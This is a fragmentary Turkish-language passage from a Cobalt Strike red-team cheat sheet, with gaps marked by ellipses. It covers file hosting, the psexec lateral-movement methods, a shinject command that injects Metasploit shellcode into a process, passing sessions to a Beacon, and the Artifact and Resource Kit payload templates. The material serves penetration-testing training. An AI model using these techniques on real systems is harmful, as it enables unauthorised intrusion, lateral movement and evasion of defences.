...
Eğer barındırmak istediğiniz dosya zaten bir web sunucusunda varsa, `Attacks -> Web Drive-by -> Host File` bölümüne gidin ve barındırmak için dosyayı seçin ve web sunucu yapılandırmasını ayarlayın.
...
### Yeni oturum açma oturumu oluştur, luid ve processid not edin
...
## Yöntemler:
## psexec                    x86   Bir hizmeti bir Service EXE nesnesi çalıştırmak için kullan
## psexec64                  x64   Bir hizmeti bir Service EXE nesnesi çalıştırmak için kullan
## psexec_psh                x86   Bir hizmeti bir PowerShell one-liner çalıştırmak için kullan
...
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 sürecine metasploit shellcode enjekte et

# Metasploit oturumunu Cobalt Strike'a geçirme
## Stageless Beacon shellcode oluşturun, Attacks > Packages > Windows Executable (S) bölümüne gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve x64 payload kullanın.
...
```
Aggressive script `dist-pipe\artifact.cna` dosyasını yüklemeyi unutmayın, böylece Cobalt Strike'ın istediğimiz disk kaynaklarını kullanmasını ve yüklenenleri kullanmamasını belirtebiliriz.

### Resource Kit

ResourceKit klasörü, PowerShell, VBA ve HTA dahil olmak üzere Cobalt Strike'ın script tabanlı payloadları için şablonları içerir.
